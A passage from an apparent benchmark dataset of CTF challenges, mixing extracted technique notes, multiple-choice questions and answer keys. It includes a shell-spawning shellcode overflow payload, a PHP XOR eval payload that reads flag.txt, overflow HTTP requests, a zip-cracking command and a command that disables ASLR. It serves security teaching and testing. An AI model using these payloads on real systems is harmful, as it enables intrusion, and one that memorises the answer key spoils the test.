            "When crafting a custom DNS query to bypass size limitations, which of the following accurately describes a method for manual byte manipulation within a DNS message to leverage compression? - A. Modifying the RCODE in the DNS header to flag parts of the message for compression. - B. Using the DNS question section to store the entire query, disregarding the need for a header. - C. Replacing part of the DNS header, like the transaction ID, with a compressible domain segment and pointing to it from the question section. - D. Encoding the DNS message with a proprietary compression algorithm before sending it to the DNS server."
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "minigame",
        "write_up": "dataset/raw/minigame.md",
        "type": "reverse",
        "competition": [
            "SPbCTF/2021/Quals",
            "https://ctftime.org/event/1378/tasks/"
        ],
        "score": 500,
        "max_score": 500,
        "difficulty": 1.0,
        "knowledge": [
            "In challenges involving game logic or puzzles, the presence of hidden or coded functionalities (e.g., cheat codes) can be discovered by closely examining the game's function calls and variables interactions. Specifically, if a game's logic includes checking a variable (such as \"is_cheat_active\") that affects game outcomes (such as accessing a \"win\" function), reversing or manipulating input sequences that influence these variables can lead to unintended or advantageous states. This approach requires observing conditional checks within the game's logic that change the game's state based on specific inputs or conditions.",
            "In challenges allowing user input in specific formats (for example, BASE64), if there is a lack of proper input validation or boundary checking, it can lead to buffer overflow vulnerabilities. Exploiting such vulnerabilities can involve crafting payloads that include shellcode for command execution. This method is particularly effective in scenarios where the application processes encoded input and stores it in a buffer that is too small to contain the decoded input plus the exploit. To exploit this, one must craft a payload that, when decoded, overflows the buffer and ideally overwrites a return address or a function pointer to achieve code execution.\n   - Sample of payload: `python2 -c 'print(\"A\"*76 + \"\\xb8\\x2f\\xbin\\x2f\\x2f\\x2fsPH\\x89\\xe7hri\\x01\\x01\\x814\\x24\\x01\\x01\\x01\\x011\\xf6Vj\\x08^H\\x01\\xe6VH\\x89\\xe61\\xd2j;X\\x0f\\x05\")' | base64 -w0`"
        ],
        "question": [
            "In a cybersecurity challenge, a game's progression logic is determined by a variable check on \"is_cheat_active,\" which, when set, directly calls a \"win\" function, bypassing standard progression. Using a specific cheat code before the game starts can modify this variable. From the options below, which accurately describes how one could activate the cheat mode based on the provided scenario?  - A. Increase the game speed to twice its normal rate to skip difficult levels. - B. Perform a series of button inputs (UP UP DOWN DOWN LEFT RIGHT LEFT RIGHT B A) to trigger the cheat mode. - C. Enter a special username to automatically win the game. - D. Hack into the game's database and manually change the \"is_cheat_active\" variable to true. ",
            "When exploiting a buffer overflow vulnerability by sending a BASE64-encoded payload that, once decoded, exceeds the buffer limits and overwrites crucial control data, which of the following actions should be performed immediately after ensuring your payload fits within the exploitable buffer?  - A. Convert the payload into HEX format before encoding to ensure compatibility with the exploit. - B. Calculate the exact buffer size required to overwrite the return address and add NOP sleds accordingly. - C. Use a debugger to step through the program execution and identify the exact overflow point. - D. Craft a payload that includes shellcode for command execution and ensure it is properly BASE64 encoded before submission. "
        ],
        "answer": [
            "B",
            "D"
        ]
    },
    {
        "name": "misc_CodeTiger orz Is Meta",
        "write_up": "dataset/raw/misc_CodeTiger orz Is Meta.md",
        "type": "forensics",
        "competition": [
            "LIT/2022",
            "https://ctftime.org/event/1694/tasks/"
        ],
        "score": -1.0,
        "max_score": 445,
        "difficulty": -1,
        "knowledge": [
            "When analyzing images for hidden information in CTF challenges, one of the effective methods is to inspect the XMP metadata for parts of the flag. Tools like FotoForensics or ExifTool can be utilized to extract metadata such as title, description, and rights, which might contain segments of the flag. This approach is particularly useful when direct examination of the image reveals nothing of interest.",
            "Another method to retrieve hidden information from images is by using Unix (or Unix-like) utilities like `strings`, which can extract printable strings from binary data. This can reveal the XMP metadata embedded within the image as XML content. Searching through this metadata manually or with scripts can uncover parts of the flag enclosed in standard metadata fields (title, description, rights, etc.). Additionally, text or hex editors can serve a similar purpose for extracting metadata directly from the image file.\n\nExample command using `strings`:\n```bash\nstrings example.jpg | grep -oE 'LITCTF{[^}]+}'\n```"
        ],
        "question": [
            "When attempting to uncover hidden information within an image for CTF challenges, what tool can be used to extract and view XMP metadata that might contain segments of a flag?  - A. Microsoft Word - B. Paint.NET - C. Adobe Photoshop - D. FotoForensics ",
            "To retrieve hidden information from an image in a CTF challenge, specifically to find XMP metadata as XML content, which Unix utility would be most effective in extracting printable strings that could include parts of a flag?  - A. `ls` - B. `grep` - C. `strings` - D. `chmod` "
        ],
        "answer": [
            "D",
            "C"
        ]
    },
    {
        "name": "MIT of The South",
        "write_up": "dataset/raw/MIT of The South.md",
        "type": "web",
        "competition": [
            "TexSAW/2023",
            "https://ctftime.org/event/1959/tasks/"
        ],
        "score": 150,
        "max_score": 400,
        "difficulty": 0.375,
        "knowledge": [
            "When encountering a web challenge, checking `robots.txt` can reveal hidden directories or hints for further exploration. If the `robots.txt` file gives a clue or seems to reference a specific term or concept that seems out of place (e.g., mentioning \"tobors\" instead of \"robots\"), it's wise to explore it by altering the URL or looking for related files (in this case, checking `tobors.txt` instead of `robots.txt`). This action might lead to discovering hidden paths or directories that are not directly accessible or listed on the main page.",
            "Upon finding directories or pathways that are not immediately revealing their secrets upon manual inspection, employing a web crawler can automate the search through numerous directories. The crawler should be scripted to search for specific strings or patterns in the HTML content returned by each visited directory. This is particularly effective when you have a list of directories to check but the volume makes manual inspection impractical. For example, looking for a string that is part of the flag format (`texsaw` in this scenario) can efficiently lead to the discovery of the flag's location.\n\nA basic webcrawler example script for this scenario might use Python with the requests and BeautifulSoup libraries to recursively visit and search each directory listed in `tobors.txt` for the keyword \"texsaw\"."
        ],
        "question": [
            "In a web challenge, when a robots.txt file includes unusual hints or references (e.g., mentioning \"tobors\" instead of \"robots\"), which action is most likely to help discover hidden directories or clues? - A. Ignore the clues and randomly guess the URLs to find the hidden directories. - B. Refer to the source code of the main page for embedded script tags that might load the hidden directories. - C. Search for a file or directory named with the hinted term or a variation of it (such as \"tobors.txt\" if \"tobors\" is mentioned instead of \"robots\"). - D. Increase the security settings of the browser to prevent redirections to hidden directories. ",
            "When faced with a web challenge involving numerous directories that need to be checked for a specific string within the HTML content, what is an efficient strategy to discover the flag's location? - A. Manually inspect the source code of each directory using a web browser's developer tools. - B. Use a web crawler script that automatically navigates through each directory and searches for a specific pattern or string (e.g., part of the flag format like \"texsaw\") in the returned HTML. - C. Call the website's customer service and ask for hints about the directories\u2019 content. - D. Use search engines to look up each directory individually and check if the flag has been indexed. "
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "MITM",
        "write_up": "dataset/raw/MITM.md",
        "type": "crypto",
        "competition": [
            "GoogleCTF/2018/Quals",
            "https://ctftime.org/event/623/tasks/"
        ],
        "score": 243,
        "max_score": 500,
        "difficulty": 0.486,
        "knowledge": [
            "In scenarios involving Diffie-Hellman key exchange protocol where the implementation allows for MitM (Man-in-the-Middle) attack but relies on the participants comparing the secrets to validate the key exchange integrity, selecting a base such as `-1` (which, in the context of modulo `p`, corresponds to `p-1`) can exploit the trust between parties. This approach relies on the mathematical property that raising `-1` to any power will result in one of two predictable outcomes, either `1` or `p-1` in modulo `p` arithmetic, simplifying the prediction of the shared secret in a MitM scenario.",
            "When facing a small enough space for Diffie-Hellman key exchange parameters (e.g., 32-bit primes), brute-forcing the discrete logarithm problem becomes feasible. This approach circumvents the need for more sophisticated attacks by directly computing private keys from public values, given the small parameter space. Tools like `sympy`'s `discrete_log` function can be effectively used to solve for the private keys, allowing the attacker to decrypt communications encrypted with the derived keys.\n\n   Sample of brute-forcing the discrete logarithm problem in Python:\n   ```python\n   from sympy.ntheory import discrete_log\n   primes = [1697841911,1438810907,666397859,941857673]\n   g = 13061880230110805485346525688018595113271880103717720219673350299083396780730251766148414377512386061643807530751287373200960399392170617293251618992497053\n   a_pub = [pub_value_from_alice]  # Sample public value from Alice\n\n   # Solve for Alice's private key as an example\n   priv_a_res = [int(discrete_log(primes[i], a_pub[i], g)) for i in range(4)]\n   ```"
        ],
        "question": [
            "In a scenario involving a MitM attack against a Diffie-Hellman key exchange, an attacker chooses to send a specially crafted value instead of the expected `g^ab (mod p)`. This value is chosen based on the property that, in modulo `p` arithmetic, raising `-1` to any power results in either `1` or `p-1`. Which of the following best describes the reason this approach can lead to a predictable outcome for the shared secret? - A. Because `-1` modulo `p` is always equal to `1`, making the shared secret predictable. - B. Because raising any number to the power of `0` results in `1`, simplifying the prediction of the shared secret. - C. Because raising `-1` to any power in modulo `p` arithmetic will result in one of two predictable outcomes (`1` or `p-1`), making the shared secret predictable if this value is used in place of the correct one. - D. Because raising `2` to any power in modulo `p` arithmetic results in a cyclic pattern that can be easily predicted. ",
            "Considering a scenario where the Diffie-Hellman key exchange uses very small parameter spaces (e.g., 32-bit primes), making it feasible to brute-force the discrete logarithm problem to compute private keys from public values. Which of the following would be a practical approach to solving the discrete logarithm problem in this context? - A. Utilizing a quantum computer to perform the calculations in polynomial time. - B. Applying the `discrete_log` function from the `sympy` library in Python, given the small size of the parameters. - C. Increasing the prime numbers' size to make brute-forcing impractical. - D. Employing RSA encryption instead of Diffie-Hellman to avoid brute-forcing. "
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "mixed cipher",
        "write_up": "dataset/raw/mixed cipher.md",
        "type": "crypto",
        "competition": [
            "TokyoWesterns/2018",
            "https://ctftime.org/event/651/tasks/"
        ],
        "score": 233,
        "max_score": 840,
        "difficulty": 0.2773809523809524,
        "knowledge": [
            "In RSA encryption challenges, when a least significant bit (LSB) decryption oracle is available, binary search can be leveraged to reveal the plaintext in significantly fewer queries than brute force attempts. This method is effective in retrieving a decryption key or plaintext by making judicious queries based on the oracle's feedback, typically halving the search space with each query. Given a ciphertext `C`, public key `(n, e)`, and the ability to determine the LSB of the decrypted plaintext, one can adaptively query the oracle with modified ciphertexts to zero in on the plaintext. One can initiate this process by encrypting a chosen plaintext `P` with the public key to get `C`, then multiply `C` by `2^e mod n` repeatedly, querying the oracle each time to determine the LSB, and adjust the search range accordingly.",
            "The Python `random` module's predictability, based on the Mersenne Twister PRNG, can be exploited to predict future outputs if a sequence of past outputs is known. This characteristic is critical in challenges involving randomized values where the state of the random number generator can be inferred. Tools like `RandCrack` can be used to predict future values after observing 624 bytes of outputs, which is particularly useful for deducing cryptographic parameters like IVs in encryption schemes. For example, in scenarios where an AES encryption uses a `random.getrandbits(128)` generated IV, capturing 156 (`624/4`) contiguous outputs allows one to predict the next IV, enabling decryption of ciphertexts without access to the IV.\n   \nSample of Python code to predict and exploit Mersenne Twister outputs:\n```python\nfrom randcrack import RandCrack\nrc = RandCrack()\n# Assume `observed_outputs` is a list of 156 integer outputs obtained from the target application\nfor output in observed_outputs:\n    rc.submit(output)\n# Now `rc` can predict the next output\npredicted_output = rc.predict_getrandbits(128)\n```"
        ],
        "question": [
            "In an RSA encryption system, if an attacker has access to a least significant bit (LSB) decryption oracle, which technique can be effectively used to decode the encryption key or plaintext in fewer queries by utilizing feedback from the oracle? - A. Perform a frontal assault by attempting every possible key until the correct one is found. - B. Use a brute force attack on the ciphertext without utilizing the feedback from the oracle. - C. Conduct a binary search by adapting queries based on the oracle's LSB feedback, efficiently narrowing down the search space. - D. Encrypt random plaintexts to generate a large dataset for analysis.",
            "The predictability of Python's `random` module, which is based on the Mersenne Twister, can be exploited under which condition to predict future outputs, particularly useful in decrypting data encrypted with predictable IVs? - A. After observing any random number of outputs, regardless of the quantity. - B. Only if the seed of the Mersenne Twister is known in advance. - C. Upon capturing 156 contiguous outputs from the random number generator, allowing tools like `RandCrack` to deduce the generator's internal state. - D. By determining the algorithm's implementation details through reverse engineering the Python `random` module."
        ],
        "answer": [
            "C.",
            "C."
        ]
    },
    {
        "name": "Modulus Amittendus",
        "write_up": "dataset/raw/Modulus Amittendus.md",
        "type": "crypto",
        "competition": [
            "TSG/2020",
            "https://ctftime.org/event/1004/tasks/"
        ],
        "score": 365,
        "max_score": 428,
        "difficulty": 0.852803738317757,
        "knowledge": [
            "When solving challenges involving integer manipulation and encodings, specifically in scenarios where a flag is manipulated through shifts and modular arithmetic, understanding the properties of modular arithmetic can reveal the original data. In such cases, if a value is shifted (multiplied) by a power of 2, then finding the inverse modulo of a divisor that shares no common factors with the base of the shift (other than 1) can reverse the operation. For a flag encrypted by left shifting in binary (equivalent to multiplying by a power of 2) and then reduced modulo a large power of 10, using a factor of this modulus that does not share a common factor with 2 can help in retrieving the flag. Specifically, if the modulus used in encryption shares a factor with the base used in shifting (i.e., 2), an alternate factor that does not share this commonality may be used to find the modulo inverse and thus decrypt the flag.\n   \n   Example in a scenario where `flag << 10000 % 10**175` is known, using `5**175` as the modulus to find the inverse and retrieve the flag can be effective since `5**175` is a divisor of `10**175` and shares no common factors with 2.",
            "In cryptography challenges, especially when dealing with RSA encryption where direct access to the private key parameters is not available, leveraging given information about public key components incorrectly labeled or inverses of prime factors can be crucial. When primes (p, q), public exponent (e), and incorrectly labeled private exponent (d) are given, or factors such as `cf = q**-1 mod p`, identifying and exploiting relations between these values can lead to the determination of the modulus n = p*q. Techniques like iterating over possible values of k (where `e * d - 1 = k * phi(n)`) to calculate phi(n) and using given inverses to derive one of the primes (p or q) through gcd operations or relationships between the prime factors, their inverses, and phi(n), are key. \n\n   Example in the scenario where `cf = q**-1 mod p` and `d` (private exponent) is mistakenly provided instead of `n`, calculate `phi(n)` through trial with `k` values and use provided inversely related numbers (like cf) to derive primes and reconstruct n. This method involves computing `gcd(pmul values, n)` where `pmul = cf * phi(n) - cf + 1` to find p, allowing recovery of n and decryption of the ciphertext."
        ],
        "question": [
            "In a given cryptographic scenario, a flag encrypted as `flag << 10000 % 10**175` is provided, and it's suggested to use `5**175` as a modulus for decryption. This approach relies on understanding the intersection of shifting operations and modular arithmetic in cryptography. What is the reason behind choosing `5**175` as the modulus for decrypting the flag?  - A. Because `5**175` shares a common factor with 2, allowing easy computation of the inverse. - B. Because `5**175` does not share any common factors with 2, making it possible to compute the inverse modulo which is essential for decryption. - C. Because `5**175` is larger than `2**400`, ensuring that the original flag's value is preserved during decryption. - D. Because `5**175` directly represents the binary equivalent of the encrypted flag, simplifying reverse operations. ",
            "In an RSA encryption challenge, it is observed that the `d` value (private exponent) is mistakenly provided instead of the modulus `n`, and a calculation involving `cf = q**-1 mod p` is suggested. This scenario suggests leveraging mathematical relationships between RSA parameters for decryption. How can one derive the value of `p` using the provided values and relationships in this challenge?  - A. By directly computing `p` as `d - cf`, assuming that `p` is directly derivable from given RSA parameters. - B. By iterating through possible values of `k` to compute `phi(n)` and then using `cf` and `phi(n)` to calculate a multiple of `p` (`pmul = cf * phi(n) - cf + 1`), followed by finding `gcd(pmul values, n)` to obtain `p`. - C. By calculating `p` as `e * d % cf`, using a direct modulus operation to derive prime numbers from provided inverses. - D. By simply inverting `cf` to find `q` and assuming `p = n/q`, misunderstanding the relationships between RSA components. "
        ],
        "answer": [
            "B. Because `5**175` does not share any common factors with 2, making it possible to compute the inverse modulo which is essential for decryption.",
            "B. By iterating through possible values of `k` to compute `phi(n)` and then using `cf` and `phi(n)` to calculate a multiple of `p` (`pmul = cf * phi(n) - cf + 1`), followed by finding `gcd(pmul values, n)` to obtain `p`."
        ]
    },
    {
        "name": "mod_pwn",
        "write_up": "dataset/raw/mod_pwn.md",
        "type": "pwn",
        "competition": [
            "BSidesTLV/2022",
            "https://ctftime.org/event/1680/tasks/"
        ],
        "score": -1,
        "max_score": 100,
        "difficulty": -1,
        "knowledge": [
            "In challenges involving buffer overflows within web server modules or similar contexts, creating a buffer overflow can allow for unintended memory access. Specifically, overwriting adjacent memory locations can lead to control over variables that hold critical data, such as pointers that can be manipulated to point towards a flag stored in memory. This is executed by sending input that fills the buffer and overwrites additional memory locations with calculated values. Sample payload when targeting an HTTP server\u2019s query parameter: `GET /path?parameter=AAAA...AAAAX` where `AAAA...AAAA` is the buffer-filling payload and `X` is the calculated value to overwrite an adjacent memory location, such as a pointer to manipulate its reference.",
            "When crafting exploits for buffer overflows, guessing or calculating the exact offset needed to manipulate specific memory locations (such as pointers) can be crucial. This often involves sending payloads of varying lengths or with specific characters to identify how memory layout shifts in response to input, known as a brute force or fuzzing approach. Once the correct offset is discovered, it can be used to precisely target and manipulate memory, such as redirecting a function pointer or, as in the scenario described, changing the reference of a suffix variable to point to a flag in memory. Sample approach for finding the offset might involve incrementally increasing payload length or systematically changing the payload characters, followed by observing the system's response or output for indications of successful manipulation."
        ],
        "question": [
            "When addressing buffer overflow vulnerabilities in an HTTP server module, which of the following payloads correctly demonstrates how to potentially overwrite adjacent memory locations after filling a buffer to manipulate a pointer? - A. `GET /ctf?name=abcdefghijklmnopqrstuvwxy` - B. `POST /update?data=AAAABBBBCCCC` - C. `GET /ctf?name=yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy+` - D. `DELETE /user?id=12345` ",
            "In the context of exploiting buffer overflow vulnerabilities, which technique is essential for determining the exact offset needed to target specific memory locations for manipulation, such as altering a variable's reference to point to sensitive data stored in memory? - A. Performing a detailed code review to understand the application logic - B. Utilizing a brute force approach to systematically test different payload lengths or characters - C. Encrypting payloads to bypass security filters - D. Increasing the payload size to its maximum allowed limit "
        ],
        "answer": [
            "C. The payload is designed to fill the buffer and include an additional character to overwrite adjacent memory, such as a pointer, which aligns with the knowledge of creating buffer overflows to manipulate critical data by overwriting memory locations.",
            "B. Utilizing a brute force approach to test varying payload lengths or characters is crucial for identifying the precise offset required for successful memory manipulation. This technique aligns with the practice of discovering offsets for targeted exploits, especially in buffer overflow scenarios."
        ]
    },
    {
        "name": "mom can we have AES",
        "write_up": "dataset/raw/mom can we have AES.md",
        "type": "crypto",
        "competition": [
            "UIUCTF/2022",
            "https://ctftime.org/event/1600/tasks/"
        ],
        "score": -1,
        "max_score": -1,
        "difficulty": -1,
        "knowledge": [
            "When facing challenges involving AES encryption, especially with an ECB (Electronic CodeBook) mode due to its property where the same plaintext block produces the same ciphertext block, one can exploit this by manipulating the alignment of secret data (like a flag) relative to block boundaries. This enables a differential analysis where varying the input can reveal patterns in the encryption output, facilitating the brute-forcing of secret data. The method involves guessing one character at a time by observing the changes in encrypted output as the input aligns differently with block boundaries. This technique is particularly effective in environments where the attacker can influence the plaintext immediately preceding the secret data.",
            "In challenges involving AES encryption in CBC (Cipher Block Chaining) mode, since the decryption of each block depends only on the session key and the ciphertext of the previous block, one can manipulate the plaintext through chosen plaintext attacks to infer the contents of adjacent blocks or reveal secret data appended to controlled plaintext. The strategy involves adjusting the input plaintext in such a way that the secret data's alignment with block boundaries can be systematically tested against known blocks, allowing for incremental decryption or deduction of the secret data. Utilizing this mode requires a careful management of the IV (Initialization Vector) and ciphertext blocks to effectively apply chosen plaintext attacks for revealing secret information."
        ],
        "question": [
            "In an AES encryption system using ECB mode, how can attackers exploit the encryption to incrementally reveal a secret string like a flag? - A. By sending large volumes of random data to overload the encryption algorithm. - B. By manipulating the plaintext's alignment with the encryption block boundaries and observing changes in the output for differential analysis. - C. By requesting the encrypted secret directly through SQL injection. - D. By using a sophisticated machine learning algorithm to guess the encryption key.",
            "How can an attacker exploit the AES CBC mode to reveal a secret appended to a controlled plaintext? - A. By performing a man-in-the-middle attack to intercept and modify encrypted messages. - B. By cracking the encryption key using brute-force attack technics. - C. By carefully adjusting the input plaintext and using known ciphertext from previous blocks to perform chosen plaintext attacks. - D. By exploiting server-side vulnerabilities to bypass the encryption altogether."
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "mondai",
        "write_up": "dataset/raw/mondai.zip.md",
        "type": "misc",
        "competition": [
            "TokyoWesterns/2018",
            "https://ctftime.org/event/651/tasks/"
        ],
        "score": -1.0,
        "max_score": 840,
        "difficulty": -1,
        "knowledge": [
            "In challenges involving zip files, if immediate efforts to find a password (such as using basic commands like `strings` for potential plaintext strings inside the file) are unsuccessful, leveraging a dictionary attack with a known wordlist (e.g., rockyou.txt) can be effective, particularly when no other context or file is provided to aid in the password discovery process.\nExample payload: `fcrackzip -u -v -D -p /usr/share/wordlists/rockyou.txt file.zip`",
            "In scenarios where pcap files are provided, analyzing the traffic and focusing on details such as payload lengths can reveal hidden information. This approach is useful in cases where direct communication data does not offer clues, but the technical details of the packets (e.g., size, destination IP) carry encoded or indirect messages.\nExample analysis process description: Track the payload lengths of packets destined to a specific IP and use these lengths as clues for passwords or keys."
        ],
        "question": [
            "When attempting to crack a ZIP file's password without any hints or context, and common methods yield no results, which of the following commands utilizes a known wordlist to perform a dictionary attack efficiently? - A. `zip2john file.zip > file.hash; john file.hash --wordlist=/usr/share/wordlists/rockyou.txt` - B. `gzip -d file.zip; grep -a -F --color=auto /usr/share/wordlists/rockyou.txt` - C. `fcrackzip -u -v -D -p /usr/share/wordlists/rockyou.txt file.zip` - D. `unzip -P $(cat /usr/share/wordlists/rockyou.txt) file.zip` ",
            "During a forensic analysis of a provided pcap file with no direct clues in the communication data, what technique can be applied to uncover hidden information that may assist in password recovery? - A. Inspecting the metadata of each packet for hidden files or messages. - B. Analyzing the sequence numbers of TCP packets for patterns or clues. - C. Tracking the payload lengths of packets destined to a specific IP and interpreting these lengths as clues. - D. Converting hexadecimal values found in packet payloads directly into ASCII text. "
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "Money Money Money",
        "write_up": "dataset/raw/Money Money Money.md",
        "type": "crypto",
        "competition": [
            "vishwa/2022",
            "https://ctftime.org/event/1548/tasks/"
        ],
        "score": 499,
        "max_score": 500,
        "difficulty": 0.998,
        "knowledge": [
            "When faced with a password-protected zip archive and dictionary attacks such as using John the Ripper with the rockyou wordlist do not work, inspecting accompanying files (like images) for hidden content or steganography can reveal alternative paths or hints. Tools like `binwalk` can be used to detect embedded files within images or other containers. Example usage: `binwalk richies.jpeg`.",
            "For OSINT challenges involving blockchain transaction research, utilizing specific tools and databases related to the blockchain of interest (e.g., Etherscan for Ethereum) can yield valuable information. When the challenge hints towards specific transactions, corporate entities, or individuals, databases such as the International Consortium of Investigative Journalists\u2019 Offshore Leaks can be pivotal in uncovering necessary details. Usage of such databases involves searching with keywords extracted from hints or decoded messages within the challenge context."
        ],
        "question": [
            "When attempting to access the content of a password-protected zip archive during a CTF challenge and straightforward methods like a dictionary attack fail, what is a recommended next step to potentially uncover either the password or additional clues? - A. Perform a brute force attack on the zip archive using a custom script. - B. Inspect accompanying files for hidden data or clues, using tools like `binwalk` to detect embedded files. - C. Increase the processing power available for the dictionary attack to ensure faster results. - D. Guess the password based on the challenge's name or description.",
            "In the context of an OSINT challenge where you are required to investigate specific blockchain transactions, corporate entities, or individuals related to the Ethereum blockchain, which approach is most effective for gathering the necessary information? - A. Directly contacting the individuals involved for information. - B. Browsing general social media websites for any mention of the blockchain transactions. - C. Using blockchain-specific search tools like Etherscan and databases such as the International Consortium of Investigative Journalists\u2019 Offshore Leaks to search with relevant keywords. - D. Attempting to hack into the blockchain to directly access transaction data."
        ],
        "answer": [
            "B.",
            "C."
        ]
    },
    {
        "name": "morph",
        "write_up": "dataset/raw/morph.md",
        "type": "This write-up is about a reverse challenge called `m0rph` from 34C3CTF.",
        "competition": [
            "C3CTF/2017",
            "https://ctftime.org/event/544/tasks/"
        ],
        "score": 49,
        "max_score": 477,
        "difficulty": 0.10272536687631027,
        "knowledge": [
            "When debugging a binary with ASLR enabled proving to be challenging, disabling ASLR can simplify the process by making memory addresses predictable across runs. This can be achieved by executing `echo 0 | sudo tee /proc/sys/kernel/randomize_va_space` in the terminal.",
            "In reverse engineering challenges where the binary performs a series of checks on an input string (potentially a flag), one effective strategy is iteratively debugging and observing the comparison instructions (`cmp`) to deduce the correct characters of the input. This process involves setting breakpoints at critical instructions, stepping through the comparisons, and adjusting the input based on the expected vs. actual values at each step.\n   Example process:\n   - Start the process with an initial guess.\n   - Set breakpoints on comparison instructions.\n   - Run and step through the program to each breakpoint.\n   - Observe the comparisons to identify the expected character at each position.\n   - Adjust the guessed input based on these observations and repeat the process until the expected output is achieved."
        ],
        "question": [
            "To make debugging processes simpler and make memory addresses predictable, administrators may need to disable ASLR on their systems. Which of the following commands correctly disables ASLR on a Linux system?  - A. `sudo sysctl -w kernel.randomize_va_space=1` - B. `echo 0 | sudo tee /proc/sys/kernel/randomize_va_space` - C. `sudo chmod +x /proc/sys/kernel/randomize_va_space` - D. `echo \"disable\" > /proc/sys/kernel/randomize_va_space` ",
            "In a reverse engineering task involving a binary that checks an input string against a hard-coded flag, one method to identify the correct flag is an iterative debug-and-check approach. If an initial guess doesn't pass, and a breakpoint halts the execution at a `cmp` instruction comparing a provided character to an expected one, what should you do next?  - A. Immediately terminate the debug session and start over with a completely different flag format. - B. Continue the program execution without modifications to identify further character positions in one run. - C. Note down the expected character, modify the guess accordingly, and continue debugging to find the next character. - D. Increase the length of the input flag to bypass the character comparison checks. "
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "Most Secure Calculator 2",
        "write_up": "dataset/raw/Most Secure Calculator 2.md",
        "type": "pwn",
        "competition": [
            "KnightCTF/2022",
            "https://ctftime.org/event/1545/tasks/"
        ],
        "score": 250,
        "max_score": 250,
        "difficulty": 1.0,
        "knowledge": [
            "When faced with a challenge that only allows numbers and symbols but requires injection of alphabetic strings or commands, using the XOR operator can transform permissible characters into desired alphabetic characters. This method can be particularly effective in bypassing input restrictions or filters in web applications or PHP scripts where the `eval` function is used. For example, crafting specific characters using XOR to bypass restrictions and execute commands like `file_get_contents`. A general approach to crafting alphabetic strings with XOR could be `('<character 1>'^'<character 2>')` to generate a single required letter or command part.",
            "If the application uses the `eval` function to process user input, and you are constrained by a character limit or unable to use variable functions directly due to PHP `eval` limitations, crafting a payload that indirectly calls built-in PHP functions can achieve remote code execution or file reading capabilities. A strategy involves assembling a function call through concatenated strings, constructed accurately within the constraints. The concatenation method allows for dynamic assembly of the function call without running into the character limit or the direct use of restricted alphabetic characters. A specific example payload under these conditions is:  \n```  \n('@@@@\"_@@\"@@@@@@@@'^'&),%}8%4}#/.4%.43')((\"@@@_\"^\"&,!8\").(\".\").(\"@@@\"^\"484\"))  \n```  \nThis payload demonstrates how to use XOR and concatenation to create the `file_get_contents(\"flag.txt\")` call without directly writing the function name or using double quotes, effectively reading the contents of `flag.txt` within the application's constraints."
        ],
        "question": [
            "In a PHP-based web application, when direct injection of alphabetic characters is restricted and you need to bypass this limitation using the XOR operator, which of the following examples correctly demonstrates how to generate the letter 'E' using only symbols and numbers? - A.(`$`^`#`) - B.(`%`^`!`) - C.(`%`^'`') - D.(`@`^`*`)",
            "When attempting to read the contents of \"flag.txt\" in a PHP web application that uses the `eval` function for processing input, with restrictions on alphabetic characters and a character limit, which of the following approaches correctly illustrates the method for crafting a dynamic function call using XOR and concatenation within these constraints? - A.Using direct function calls with alphabetic names and double quotes. - B.Creating a payload that indirectly assembles the function call using XOR to generate each part of the function name and then concatenating these parts. - C.Increasing the character limit of the input to allow direct insertion of the function call. - D.Using variable functions to directly call `file_get_contents` with the filename as a variable."
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "Movie Marathon",
        "write_up": "dataset/raw/Movie Marathon.md",
        "type": "pwn",
        "competition": [
            "HacktivityCon/2021",
            "https://ctftime.org/event/1444/tasks/"
        ],
        "score": 444,
        "max_score": 500,
        "difficulty": 0.888,
        "knowledge": [
            "When given a CTF challenge related to gathering specific details (e.g., actors in a movie), leveraging public APIs like themoviedb.org can expedite data retrieval and solve the puzzle. First, identify the API endpoint that allows searching for a movie by its name to obtain unique identifiers such as the movie's ID. Subsequently, use the movie's ID with the appropriate endpoint to fetch detailed information, like the list of actors. \n\n   - For finding a movie's ID using its name:\n     ```python\n     import urllib.request, json\n     \n     def get_movie_id_from_movie_name(movie_name):\n         api_key = \"<your_api_key_here>\"\n         query = movie_name.replace(\" \", \"+\")\n         url = f\"https://api.themoviedb.org/3/search/movie?api_key={api_key}&query={query}\"\n         response = urllib.request.urlopen(url)\n         data = json.loads(response.read())\n         return next((item[\"id\"] for item in data[\"results\"] if item[\"title\"] == movie_name), None)\n     ```\n   \n   - For getting actor names from a movie ID:\n     ```python\n     def get_actor_from_movie_id(movie_id):\n         api_key = \"<your_api_key_here>\"\n         url = f\"https://api.themoviedb.org/3/movie/{movie_id}/credits?api_key={api_key}&language=en-US\"\n         response = urllib.request.urlopen(url)\n         data = json.loads(response.read())\n         actors = [actor[\"name\"] for actor in data[\"cast\"]]\n         return actors\n     ```",
            "In scenarios where the challenge involves interacting with an external service (e.g., a CTF challenge server), the `pwn` library can be used to automate network interactions, receive the challenge prompt, and send solutions. This library significantly simplifies the process of scripting the interaction with servers for challenges.\n\n   - Sample code snippet for interacting with a challenge server using `pwn`:\n     ```python\n     from pwn import *\n     \n     server_address = \"challenge.ctf.games\"\n     port = 31260\n     \n     # Establishing a connection to the server\n     r = remote(server_address, port)\n     \n     # Receiving a message from the server\n     challenge_prompt = r.recvline().decode()\n     \n     # Processing the challenge prompt and extracting necessary details\n     # (E.g., movie name and production year, then leveraging the above functions to solve it)\n     \n     # Sending back the solution to the server\n     r.sendline(\"<solution>\")\n     \n     # Receiving the flag\n     flag = r.recvline().decode()\n     print(flag)\n     \n     # Closing the connection\n     r.close()\n     ```"
        ],
        "question": [
            "In a scenario where you need to write a script to automate the process of retrieving a movie's ID using its name with a public movie database API, which of the following Python code snippets correctly demonstrates how to replace spaces in a movie name with \"+\" symbols for API requests?  - A. `movie_name.replace(\" \", \"%20\")` - B. `movie_name.replace(\" \", \"+\")` - C. `\"+\".join(movie_name.split())` - D. `movie_name.split(\" \").join(\"+\")` ",
